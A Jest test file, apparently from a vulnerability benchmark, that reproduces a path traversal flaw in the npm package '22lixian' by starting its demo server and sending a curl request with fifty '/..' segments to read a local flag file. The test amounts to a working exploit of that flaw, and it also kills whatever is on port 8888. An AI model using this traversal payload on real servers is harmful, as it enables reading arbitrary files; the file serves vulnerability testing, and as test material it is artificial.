const v23 = require('child_process');
var execSync = v23.execSync;
const v25 = () => {
    try {
        const v24 = execSync('fuser -k 8888/tcp');
        v24;
    } catch (e) {
    }
};
const v26 = afterAll(v25);
v26;
const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v27 = '/..'.repeat(50);
    const v28 = v27 + pathToFlag;
    return v28;
};
const v43 = done => {
    const v29 = expect.assertions(1);
    v29;
    const fs = require('fs');
    const sleep = require('sleep');
    const v30 = require('child_process');
    const exec = v30.exec;
    const v31 = fs.readFileSync(pathToFlag);
    let hostsFile = v31.toString();
    const a = require('child_process');
    try {
        const v32 = () => {
        };
        const v33 = a.execSync('fuser -k 8888/tcp', v32);
        v33;
    } catch (e) {
    }
    let server = 'node ./node_modules/22lixian/demo.js';
    const v34 = (error, stdout) => {
    };
    const v35 = exec(server, v34);
    v35;
    const v36 = sleep.sleep(2);
    v36;
    const v37 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${ v37 }"`;
    const v41 = (error, stdout) => {
        const v38 = expect(stdout);
        const v39 = v38.toBe(hostsFile);
        v39;
        const v40 = done();
        v40;
    };
    const v42 = exec(attack_string, v41);
    v42;
};
const v44 = test('Path Traversal in 22lixian', v43);
v44;